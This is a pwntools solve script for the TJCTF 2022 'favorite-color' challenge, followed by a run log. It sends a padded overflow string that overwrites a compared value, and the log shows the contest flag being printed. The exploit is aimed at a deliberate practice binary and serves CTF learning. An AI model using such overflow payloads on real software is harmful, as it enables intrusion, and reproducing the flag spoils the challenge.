from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chall'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "tjc.tf"
  PORT = 31453
  s = remote(HOST, PORT)
else:
  s = process(BINARY)


s.recvuntil("rgb value? (format: r, g, b)\n")
s.sendline("50,84,52")

s.recvuntil("good... good... and its pretty name?\n")
s.sendline("A"*37+"4T2")

s.interactive()

'''
mito@ubuntu:~/CTF/TJCTF_2022/Pwn_favorite-color$ python solve.py r
[*] '/home/mito/CTF/TJCTF_2022/Pwn_favorite-color/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to tjc.tf on port 31453: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA2T4AA4T2 (50, 84, 52) is a pretty cool color... but it's not as cool as purple (50, 84, 52)...
oh wait...
it seems as if they're the same...
here's a flag: tjctf{i_l1k3_gr3y_a_l0t_f49ad3}
'''
